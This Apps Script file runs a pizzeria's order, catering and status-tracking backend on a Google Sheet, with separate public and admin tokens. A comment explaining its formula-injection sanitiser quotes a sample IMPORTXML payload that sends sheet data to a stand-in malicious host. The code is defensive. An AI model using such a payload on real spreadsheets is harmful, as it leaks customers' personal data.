/**
 * Mextizza — puente entre la web/app/captura manual y un Google Sheet que
 * actúa como base de datos, más el Centro de Ventas (SalesCenter.dc.html).
 *
 * Cómo instalarlo:
 * 1. Crea un Google Sheet nuevo llamado "Mextizza — Operación".
 * 2. En el Sheet: Extensiones → Apps Script. Borra el contenido de Code.gs
 *    que viene por defecto y pega TODO este archivo.
 * 3. Corre la función `configurarHojas` una vez (menú Ejecutar → configurarHojas).
 *    Te va a pedir autorización — es tu propio Sheet, es seguro aceptar.
 *    Esto crea las 6 pestañas con sus encabezados.
 * 4. Corre `configurarToken` UNA vez (token público, va en la web y la app) y
 *    `configurarTokenAdmin` UNA vez (token de administrador, solo para el
 *    Centro de Ventas). Revisa el log de ejecución para verlos, o ve a
 *    Configuración del proyecto → Propiedades del script.
 *    El token público solo puede crear pedidos, pedir catering y consultar el
 *    estado de un folio. Listar pedidos, avanzar estado y cancelar exigen el
 *    token de administrador.
 * 5. Despliega: Implementar → Nueva implementación → tipo "Aplicación web".
 *    - Ejecutar como: Yo (tu cuenta)
 *    - Quién tiene acceso: Cualquier usuario
 *    Copia la URL que te da — esa es la que conecta la web, la app y el
 *    Centro de Ventas con este Sheet.
 * 6. Cada vez que edites este código, tienes que crear una NUEVA versión de
 *    la implementación (Implementar → Administrar implementaciones → editar
 *    → Nueva versión) para que los cambios surtan efecto en la URL pública.
 */

const SHEETS = {
  ordenes: 'ordenes',
  ordenItems: 'orden_items',
  itemComplementos: 'item_complementos',
  productos: 'productos',
  complementos: 'complementos',
  clientes: 'clientes',
  catering: 'catering'
};

/* Minutos tras crear el pedido en los que el cliente puede cancelarlo el mismo.
   Despues de eso ya hay masa e ingredientes comprometidos y la cancelacion pasa
   por el Centro de Ventas. Tiene que coincidir con MEXTIZZA_FACTS.cancelacionMin
   en ui_kits/menu-data.js, que es lo que decide si se ve el boton. */
const CANCELACION_CLIENTE_MIN = 15;

const ESTADOS_ACTIVOS = ['recibida', 'confirmada', 'horno', 'lista', 'camino'];
const TS_POR_ESTADO = {
  confirmada: 't_confirmada',
  horno: 't_horno',
  lista: 't_lista',
  camino: 't_camino',
  entregada: 't_entregada'
};

const ORDENES_HEADERS = ['folio', 'canal', 'estado', 'cliente_telefono', 'cliente_nombre', 'direccion', 'colonia', 'km', 'pago_metodo', 'pago_estado', 'subtotal', 'total', 't_recibida', 't_confirmada', 't_horno', 't_lista', 't_camino', 't_entregada', 'reparto', 'notas', 'motivo_cancelacion'];
const ORDEN_ITEMS_HEADERS = ['linea_id', 'folio', 'producto_id', 'producto_nombre', 'cantidad', 'precio_unit', 'complementos_total', 'importe'];
const ITEM_COMPLEMENTOS_HEADERS = ['linea_id', 'complemento_id', 'complemento_nombre', 'precio'];
const PRODUCTOS_HEADERS = ['id', 'nombre', 'descripcion', 'categoria', 'precio', 'activo', 'foto'];
const COMPLEMENTOS_HEADERS = ['id', 'nombre', 'grupo', 'precio', 'activo'];
const CLIENTES_HEADERS = ['telefono', 'nombre', 'direccion', 'colonia', 'notas', 'pedidos'];
const CATERING_HEADERS = ['folio', 'nombre', 'telefono', 'personas', 'fecha_evento', 'notas', 'estado', 'creado_en'];

/** Corre esto UNA vez para crear las 6 pestañas con encabezados. No borra datos si ya existen. */
function configurarHojas() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const specs = [
    [SHEETS.ordenes, ORDENES_HEADERS],
    [SHEETS.ordenItems, ORDEN_ITEMS_HEADERS],
    [SHEETS.itemComplementos, ITEM_COMPLEMENTOS_HEADERS],
    [SHEETS.productos, PRODUCTOS_HEADERS],
    [SHEETS.complementos, COMPLEMENTOS_HEADERS],
    [SHEETS.clientes, CLIENTES_HEADERS],
    [SHEETS.catering, CATERING_HEADERS]
  ];
  specs.forEach(([nombre, headers]) => {
    let sh = ss.getSheetByName(nombre);
    if (!sh) sh = ss.insertSheet(nombre);
    if (sh.getLastRow() === 0) {
      sh.getRange(1, 1, 1, headers.length).setValues([headers]);
      sh.setFrozenRows(1);
    }
  });
  const def = ss.getSheetByName('Sheet1') || ss.getSheetByName('Hoja 1');
  if (def && def.getLastRow() === 0 && ss.getSheets().length > 6) ss.deleteSheet(def);
}

/** Corre esto UNA vez para generar el token PÚBLICO (el que va en la web y la app). */
function configurarToken() {
  const props = PropertiesService.getScriptProperties();
  if (props.getProperty('TOKEN')) {
    Logger.log('Ya existe un token público: ' + props.getProperty('TOKEN'));
    return;
  }
  const token = Utilities.getUuid();
  props.setProperty('TOKEN', token);
  Logger.log('Token público generado — va en ui_kits/sheets-config.js: ' + token);
}

/** Corre esto UNA vez para generar el token de ADMINISTRADOR (solo Centro de Ventas).
 *  Este NO debe escribirse en ningún archivo del repo: se pega a mano en el
 *  Centro de Ventas la primera vez y se queda guardado en ese navegador. */
function configurarTokenAdmin() {
  const props = PropertiesService.getScriptProperties();
  if (props.getProperty('TOKEN_ADMIN')) {
    Logger.log('Ya existe un token admin: ' + props.getProperty('TOKEN_ADMIN'));
    return;
  }
  const token = Utilities.getUuid();
  props.setProperty('TOKEN_ADMIN', token);
  Logger.log('Token ADMIN generado — pégalo solo en el Centro de Ventas: ' + token);
}

/** Genera un token público nuevo e invalida el anterior. Úsalo cuando el token
 *  viejo se haya filtrado (siempre está expuesto en el JS, así que rótalo si
 *  alguna vez tuvo permisos de más). Después hay que actualizarlo en
 *  ui_kits/sheets-config.js y volver a desplegar la web y la app. */
function rotarTokenPublico() {
  const props = PropertiesService.getScriptProperties();
  const nuevo = Utilities.getUuid();
  props.setProperty('TOKEN', nuevo);
  Logger.log('Token público NUEVO (actualízalo en sheets-config.js): ' + nuevo);
}

/* Dos tokens con permisos distintos.
 *
 *   TOKEN        (público)  — viaja dentro de la web y del APK, así que cualquiera
 *                            puede leerlo. Solo sirve para acciones de cliente:
 *                            crear un pedido, pedir catering y consultar el estado
 *                            de UN folio.
 *   TOKEN_ADMIN  (privado)  — solo vive en el Centro de Ventas. Habilita listar
 *                            pedidos (que incluyen nombre y dirección de clientes),
 *                            avanzar estado y cancelar.
 *
 * Antes había un solo token para todo: como se publica junto al código del
 * cliente, cualquiera podía descargarlo y listar los datos personales de todos
 * los pedidos del día, o cancelarlos. */
function checkToken_(token) {
  const publico = PropertiesService.getScriptProperties().getProperty('TOKEN');
  const admin = PropertiesService.getScriptProperties().getProperty('TOKEN_ADMIN');
  if (!token) throw new Error('Token inválido');
  if (token === publico) return 'publico';
  if (admin && token === admin) return 'admin';
  throw new Error('Token inválido');
}

/** Acciones que exponen datos personales o modifican pedidos ajenos. */
function requiereAdmin_(nivel) {
  if (nivel !== 'admin') throw new Error('No autorizado para esta acción');
}

/* Google Sheets evalua como formula cualquier celda cuyo texto empiece con
 * = + - @ (o tab/retorno). Como el nombre, la direccion y las notas los escribe
 * el cliente desde la web o la app, un pedido con el nombre
 * =IMPORTXML("https://sitio-malo.com?d="&A1,"//a") se ejecutaria al abrir el
 * Sheet y podria filtrar datos de otros clientes hacia afuera.
 * Anteponer un apostrofo obliga a Sheets a tratarlo como texto; el apostrofo no
 * se ve al leer la celda. */
function textoSeguro_(v) {
  if (v === null || v === undefined) return "";
  var s = String(v);
  var c = s.charCodeAt(0);
  // 61 =   43 +   45 -   64 @   9 tabulador   13 retorno de carro
  if (c === 61 || c === 43 || c === 45 || c === 64 || c === 9 || c === 13) {
    return String.fromCharCode(39) + s;
  }
  return s;
}

function sheet_(nombre) {
  return SpreadsheetApp.getActiveSpreadsheet().getSheetByName(nombre);
}

function rowsAsObjects_(sh) {
  const values = sh.getDataRange().getValues();
  const headers = values.shift();
  return values.map(row => {
    const o = {};
    headers.forEach((h, i) => { o[h] = row[i]; });
    return o;
  });
}

/* Sufijo aleatorio para el folio. Sin I, O, 0 ni 1 para que nadie los
 * confunda al dictarlos por telefono. 32^5 = ~33 millones de combinaciones. */
function sufijoAleatorio_() {
  var abc = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  var out = "";
  for (var i = 0; i < 5; i++) {
    out += abc.charAt(Math.floor(Math.random() * abc.length));
  }
  return out;
}

function nextFolio_() {
  var sh = sheet_(SHEETS.ordenes);
  var n = sh.getLastRow(); // incluye encabezado, arranca en MX-0001 con la primera orden
  /* El numero sigue siendo secuencial para que sea util en la operacion, pero
   * lleva un sufijo aleatorio: el endpoint `estado` es publico por diseño, y sin
   * el sufijo cualquiera podia recorrer MX-0001, MX-0002... y leer el estado y el
   * total de todos los pedidos. */
  return "MX-" + String(n).padStart(4, "0") + "-" + sufijoAleatorio_();
}

/** Punto de entrada para escrituras: crear orden, avanzar estado, cancelar. */
function doPost(e) {
  const lock = LockService.getScriptLock();
  lock.waitLock(20000);
  try {
    const body = JSON.parse(e.postData.contents);
    const nivel = checkToken_(body.token);

    let result;
    switch (body.action) {
      case 'crear_orden':
        result = crearOrden_(body);
        break;
      case 'avanzar_estado':
        requiereAdmin_(nivel);
        result = avanzarEstado_(body);
        break;
      case 'cancelar':
        requiereAdmin_(nivel);
        result = cancelarOrden_(body);
        break;
      case 'cancelar_cliente':
        result = cancelarPorCliente_(body);
        break;
      case 'solicitar_catering':
        result = crearSolicitudCatering_(body);
        break;
      default:
        throw new Error('Acción desconocida: ' + body.action);
    }
    return jsonOut_({ ok: true, ...result });
  } catch (err) {
    return jsonOut_({ ok: false, error: String(err) });
  } finally {
    lock.releaseLock();
  }
}

/** Punto de entrada para lecturas: el Centro de Ventas pide las órdenes abiertas. */
function doGet(e) {
  try {
    const token = e.parameter.token;
    const nivel = checkToken_(token);
    if (e.parameter.action === 'listar_abiertas') {
      requiereAdmin_(nivel);
      return jsonOut_({ ok: true, ordenes: listarAbiertas_() });
    }
    if (e.parameter.action === 'listar_hoy') {
      requiereAdmin_(nivel);
      return jsonOut_({ ok: true, ordenes: listarHoy_() });
    }
    if (e.parameter.action === 'estado_por_telefono') {
      return jsonOut_({ ok: true, orden: estadoPorTelefono_(e.parameter.telefono) });
    }
    if (e.parameter.action === 'estado') {
      return jsonOut_({ ok: true, orden: estadoOrden_(e.parameter.folio) });
    }
    if (e.parameter.action === 'catalogo') {
      return jsonOut_({ ok: true, productos: rowsAsObjects_(sheet_(SHEETS.productos)), complementos: rowsAsObjects_(sheet_(SHEETS.complementos)) });
    }
    throw new Error('Acción desconocida: ' + e.parameter.action);
  } catch (err) {
    return jsonOut_({ ok: false, error: String(err) });
  }
}

function jsonOut_(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj)).setMimeType(ContentService.MimeType.JSON);
}

/**
 * body: { token, canal, cliente:{telefono,nombre}, direccion, colonia, km,
 *         pago_metodo, notas, items:[{producto_id,nombre,cantidad,precio_unit,
 *         addons:[{id,nombre,precio}]}], estadoInicial }
 */
function crearOrden_(body) {
  const folio = nextFolio_();
  const now = new Date();
  const estado = body.estadoInicial === 'confirmada' ? 'confirmada' : 'recibida';

  let subtotal = 0;
  const itemsSh = sheet_(SHEETS.ordenItems);
  const addonsSh = sheet_(SHEETS.itemComplementos);
  (body.items || []).forEach((it, i) => {
    const lineaId = folio + '-' + (i + 1);
    const addons = it.addons || [];
    const complementosTotal = addons.reduce((s, a) => s + Number(a.precio || 0), 0);
    const importe = (Number(it.precio_unit) + complementosTotal) * Number(it.cantidad || 1);
    subtotal += importe;
    itemsSh.appendRow([lineaId, folio, textoSeguro_(it.producto_id), textoSeguro_(it.nombre), it.cantidad || 1, it.precio_unit, complementosTotal, importe]);
    addons.forEach(a => addonsSh.appendRow([lineaId, textoSeguro_(a.id), textoSeguro_(a.nombre), a.precio]));
  });

  const ordenesSh = sheet_(SHEETS.ordenes);
  const row = { folio, canal: body.canal, estado, cliente_telefono: textoSeguro_(body.cliente && body.cliente.telefono), cliente_nombre: textoSeguro_(body.cliente && body.cliente.nombre), direccion: textoSeguro_(body.direccion), colonia: textoSeguro_(body.colonia), km: body.km || '', pago_metodo: textoSeguro_(body.pago_metodo), pago_estado: 'pendiente', subtotal, total: subtotal, t_recibida: now, t_confirmada: estado === 'confirmada' ? now : '', t_horno: '', t_lista: '', t_camino: '', t_entregada: '', reparto: '', notas: textoSeguro_(body.notas), motivo_cancelacion: '' };
  ordenesSh.appendRow(ORDENES_HEADERS.map(h => row[h]));

  upsertCliente_(body.cliente, body.direccion, body.colonia);

  return { folio };
}

function upsertCliente_(cliente, direccion, colonia) {
  if (!cliente || !cliente.telefono) return;
  const sh = sheet_(SHEETS.clientes);
  const data = sh.getDataRange().getValues();
  for (let r = 1; r < data.length; r++) {
    if (String(data[r][0]) === String(cliente.telefono)) {
      sh.getRange(r + 1, 6).setValue((Number(data[r][5]) || 0) + 1); // pedidos++
      return;
    }
  }
  sh.appendRow([textoSeguro_(cliente.telefono), textoSeguro_(cliente.nombre), textoSeguro_(direccion), textoSeguro_(colonia), '', 1]);
}

/** body: { token, folio } — avanza al siguiente estado del flujo. */
function avanzarEstado_(body) {
  const FLUJO = ['recibida', 'confirmada', 'horno', 'lista', 'camino', 'entregada'];
  const sh = sheet_(SHEETS.ordenes);
  const { row, index } = findOrdenRow_(sh, body.folio);
  const estadoActual = row[ORDENES_HEADERS.indexOf('estado')];
  const k = FLUJO.indexOf(estadoActual);
  if (k === -1 || k >= FLUJO.length - 1) throw new Error('La orden ya está en el último estado');
  const nuevo = FLUJO[k + 1];

  sh.getRange(index, ORDENES_HEADERS.indexOf('estado') + 1).setValue(nuevo);
  const tsCol = TS_POR_ESTADO[nuevo];
  if (tsCol) sh.getRange(index, ORDENES_HEADERS.indexOf(tsCol) + 1).setValue(new Date());
  if (nuevo === 'entregada') {
    const pagoMetodo = row[ORDENES_HEADERS.indexOf('pago_metodo')];
    if (pagoMetodo === 'Efectivo' || pagoMetodo === 'Terminal') {
      sh.getRange(index, ORDENES_HEADERS.indexOf('pago_estado') + 1).setValue('pagado');
    }
  }
  return { folio: body.folio, estado: nuevo };
}

/** body: { token, folio, motivo } */
function cancelarOrden_(body) {
  const sh = sheet_(SHEETS.ordenes);
  const { index } = findOrdenRow_(sh, body.folio);
  sh.getRange(index, ORDENES_HEADERS.indexOf('estado') + 1).setValue('cancelada');
  sh.getRange(index, ORDENES_HEADERS.indexOf('motivo_cancelacion') + 1).setValue(textoSeguro_(body.motivo));
  return { folio: body.folio, estado: 'cancelada' };
}

/** body: { token, nombre, telefono, personas, fecha_evento, notas } */
function crearSolicitudCatering_(body) {
  const sh = sheet_(SHEETS.catering);
  const folio = 'CAT-' + String(sh.getLastRow()).padStart(4, '0');
  sh.appendRow([folio, textoSeguro_(body.nombre), textoSeguro_(body.telefono), textoSeguro_(body.personas), textoSeguro_(body.fecha_evento), textoSeguro_(body.notas), 'nueva', new Date()]);
  return { folio };
}

/* Cancelacion hecha por el propio cliente desde la web o la app. A diferencia de
   cancelarOrden_ (admin), esta corre con el token publico, asi que solo puede
   tocar un pedido cuyo folio ya conoce quien llama, y solo dentro de la ventana.
   Un pedido ya entregado o cancelado nunca se toca. */
function cancelarPorCliente_(body) {
  var sh = sheet_(SHEETS.ordenes);
  var encontrado = findOrdenRow_(sh, body.folio);
  var row = encontrado.row;
  var index = encontrado.index;
  var estado = row[ORDENES_HEADERS.indexOf("estado")];
  if (estado === "cancelada") return { folio: body.folio, estado: "cancelada" };
  if (estado === "entregada") throw new Error("El pedido ya fue entregado");

  var tRecibida = row[ORDENES_HEADERS.indexOf("t_recibida")];
  var minutos = tRecibida ? (Date.now() - new Date(tRecibida).getTime()) / 60000 : 999;
  if (minutos > CANCELACION_CLIENTE_MIN) {
    throw new Error("Ya pasaron los " + CANCELACION_CLIENTE_MIN + " minutos para cancelar. Escribenos por WhatsApp.");
  }

  sh.getRange(index, ORDENES_HEADERS.indexOf("estado") + 1).setValue("cancelada");
  sh.getRange(index, ORDENES_HEADERS.indexOf("motivo_cancelacion") + 1).setValue("Cancelado por el cliente");
  return { folio: body.folio, estado: "cancelada" };
}

function findOrdenRow_(sh, folio) {
  const data = sh.getDataRange().getValues();
  const folioCol = ORDENES_HEADERS.indexOf('folio');
  for (let r = 1; r < data.length; r++) {
    if (data[r][folioCol] === folio) return { row: data[r], index: r + 1 };
  }
  throw new Error('Folio no encontrado: ' + folio);
}

/** Arma las órdenes abiertas (no entregadas ni canceladas) con sus líneas, para el Centro de Ventas. */
/** Estado de UNA orden, para la pantalla de seguimiento del cliente en la app.
 *  Devuelve sólo el avance del pedido — nunca nombre, teléfono ni dirección:
 *  el token vive en el cliente, así que este endpoint no debe poder usarse para
 *  extraer datos personales de las órdenes de nadie. */
function estadoOrden_(folio) {
  if (!folio) throw new Error('Falta folio');
  var o = rowsAsObjects_(sheet_(SHEETS.ordenes)).find(function (x) { return String(x.folio) === String(folio); });
  if (!o) return null;
  return formaEstado_(o);
}

/* Forma publica del estado de un pedido. Deliberadamente minima: ni nombre, ni
 * telefono, ni direccion, ni total, ni lo que se pidio. Solo el avance, que es
 * lo unico que la pantalla de seguimiento necesita mostrar. */
function formaEstado_(o) {
  return {
    folio: o.folio,
    estado: o.estado,
    t_recibida: o.t_recibida,
    t_confirmada: o.t_confirmada,
    t_horno: o.t_horno,
    t_lista: o.t_lista,
    t_camino: o.t_camino,
    t_entregada: o.t_entregada,
    motivo_cancelacion: o.motivo_cancelacion || ""
  };
}

/* Ultimo pedido de un telefono, para que el cliente recupere su seguimiento
 * desde otro dispositivo, o si pidio por WhatsApp y nunca tuvo el folio.
 * Devuelve la misma forma minima: quien teclee numeros al azar solo puede
 * enterarse de si ese telefono tiene un pedido en curso, nunca de quien es,
 * donde vive, ni cuanto gasto. */
function estadoPorTelefono_(telefono) {
  var tel = String(telefono || "").replace(/[^0-9]/g, "");
  if (tel.length !== 10) throw new Error("Telefono invalido");
  var ordenes = rowsAsObjects_(sheet_(SHEETS.ordenes)).filter(function (o) {
    return o.folio && String(o.cliente_telefono || "").replace(/[^0-9]/g, "") === tel;
  });
  if (!ordenes.length) return null;
  ordenes.sort(function (a, b) { return new Date(b.t_recibida) - new Date(a.t_recibida); });
  return formaEstado_(ordenes[0]);
}
function listarAbiertas_() {
  const ordenes = rowsAsObjects_(sheet_(SHEETS.ordenes)).filter(o => o.estado && o.estado !== 'entregada' && o.estado !== 'cancelada');
  return armarOrdenes_(ordenes);
}

/** Arma TODAS las órdenes de hoy (cualquier estado), para el corte del día y las pestañas
 *  de Entregadas/Canceladas del Centro de Ventas. */
function listarHoy_() {
  const hoy = new Date();
  hoy.setHours(0, 0, 0, 0);
  const ordenes = rowsAsObjects_(sheet_(SHEETS.ordenes)).filter(o => {
    if (!o.folio || !o.t_recibida) return false;
    const t = new Date(o.t_recibida);
    return t >= hoy;
  });
  return armarOrdenes_(ordenes);
}

function armarOrdenes_(ordenes) {
  const items = rowsAsObjects_(sheet_(SHEETS.ordenItems));
  const addons = rowsAsObjects_(sheet_(SHEETS.itemComplementos));

  return ordenes.map(o => {
    const lineas = items.filter(it => it.folio === o.folio).map(it => ({
      cant: it.cantidad,
      nombre: it.producto_nombre,
      importe: it.importe,
      addons: addons.filter(a => a.linea_id === it.linea_id).map(a => a.complemento_nombre)
    }));
    const minTranscurridos = o.t_recibida ? Math.floor((Date.now() - new Date(o.t_recibida).getTime()) / 60000) : 0;
    return {
      folio: o.folio, canal: o.canal, estado: o.estado,
      cliente: o.cliente_nombre, destino: o.direccion + (o.colonia ? ' · ' + o.colonia : ''),
      pago: o.pago_metodo, pagado: o.pago_estado === 'pagado',
      total: o.total, min: minTranscurridos, notas: o.notas || '', lineas
    };
  });
}
